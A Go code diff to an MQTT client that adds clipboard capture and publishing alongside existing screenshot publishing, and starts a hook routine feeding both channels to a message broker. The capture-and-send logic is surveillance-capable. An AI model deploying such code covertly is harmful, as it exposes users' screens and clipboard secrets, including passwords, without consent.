@@ -19,6 +19,11 @@ import (
 
 var config *conf.Config
 
+var privateSubTopic string
+var privatePubTopic string
+
+var name string
+
 var Mc *MqttClient
 
 type MqttClient struct {
@@ -104,6 +109,10 @@ func (c *MqttClient) ClientInit() {
 
 	c.Opts.SetClientID(config.MqttUser + "@" + ip)
 
+	name = config.MqttUser + "_" + ip
+	privateSubTopic = constants.SERVER_TOPIC + name
+	privatePubTopic = constants.CLIENT + name + constants.SERVER
+
 	// c.Opts.SetUsername(config.MqttUser)
 	// c.Opts.SetPassword(config.MqttPassword)
 
@@ -114,6 +123,7 @@ func (c *MqttClient) ClientInit() {
 
 	c.Opts.SetResumeSubs(true)
 	c.Client = mqtt.NewClient(c.Opts)
+
 	log.Logger.Infof("Client ID: %s", c.Opts.ClientID)
 	log.Logger.Debug("Client initialization succeeded!")
 }
@@ -125,10 +135,10 @@ func (c *MqttClient) SubscribeTopics() {
 	for i := 0; i < len(c.SubTopics); i++ {
 		switch c.SubTopics[i] {
 		case constants.SERVER_TOPIC:
-			// server/to/client/IP
+			// server/to/client/name
 			topic.WriteString(c.SubTopics[i])
 			topic.WriteString("/")
-			topic.WriteString(c.Ip)
+			topic.WriteString(name)
 			if token := c.Client.Subscribe(topic.String(), byte(config.MqttQos), onMessageArrive); token.Wait() && token.Error() != nil {
 				log.Logger.Error(token.Error())
 				os.Exit(1)
@@ -149,6 +159,34 @@ func (c *MqttClient) SubscribeTopics() {
 	}
 }
 
+func (c *MqttClient) publishConnect() {
+	text := &MqttMessage{
+		MsgType:  ConnectControl,
+		OpCode:   Login,
+		Username: c.Username,
+		IP:       c.Ip,
+		Data:     constants.LOGIN,
+	}
+	jsonMarshal, _ := json.Marshal(text)
+	token := c.Client.Publish(privatePubTopic, byte(c.Qos), false, jsonMarshal)
+	log.Logger.Infof("Send topic %s, OpCode is %d", privatePubTopic, Login)
+	token.Wait()
+}
+
+func (c *MqttClient) publishPing() {
+	text := &MqttMessage{
+		MsgType:  ConnectControl,
+		OpCode:   Ping,
+		Username: c.Username,
+		IP:       c.Ip,
+		Data:     constants.PING,
+	}
+	jsonMarshal, _ := json.Marshal(text)
+	token := c.Client.Publish(privatePubTopic, byte(c.Qos), false, jsonMarshal)
+	log.Logger.Infof("Send topic %s, OpCode is %d", privatePubTopic, Ping)
+	token.Wait()
+}
+
 func (c *MqttClient) publishScreenshot(data []byte) {
 	stringData := utils.ToBase64(data)
 	text := &MqttMessage{
@@ -161,6 +199,20 @@ func (c *MqttClient) publishScreenshot(data []byte) {
 	jsonMarshal, _ := json.Marshal(text)
 	token := c.Client.Publish(constants.CLIENT_TOPIC, byte(c.Qos), false, jsonMarshal)
 	log.Logger.Infof("Send topic %s, msg is picture, size=%d", constants.CLIENT_TOPIC, len(data))
+	token.Wait()
+}
+
+func (c *MqttClient) publishClipboard(data string) {
+	text := &MqttMessage{
+		MsgType:  MessageTransfer,
+		OpCode:   SendClipboard,
+		Username: c.Username,
+		IP:       c.Ip,
+		Data:     data,
+	}
+	jsonMarshal, _ := json.Marshal(text)
+	token := c.Client.Publish(constants.CLIENT_TOPIC, byte(c.Qos), false, jsonMarshal)
+	log.Logger.Infof("Send topic %s, msg is %s", constants.CLIENT_TOPIC, jsonMarshal)
 	token.Wait()
 }
 
@@ -184,11 +236,19 @@ func (c *MqttClient) Run(ctx context.Context) error {
 	c.ConnectBroker()
 	c.SubscribeTopics()
 
-	go utils.GetScreen()
+	go utils.StartHook()
+	// go utils.GetScreen()
+	// go utils.GetClipBoard()
 
 loop:
 	for {
 		select {
+		case <-ctx.Done():
+			// 跳出 retry 循环
+			break loop
+		case msg := <-utils.ClipBoardChan:
+			go c.publishClipboard(msg)
+
 		case img := <-utils.ImgChan:
 			// 将 *image.RGBA 转换为字节数组
 			var data bytes.Buffer
@@ -198,9 +258,6 @@ loop:
 			}
 			// data := utils.EncodeToBytes(img)
 			go c.publishScreenshot(data.Bytes())
-		case <-ctx.Done():
-			// 跳出 retry 循环
-			break loop
 		}
 	}
 	return nil
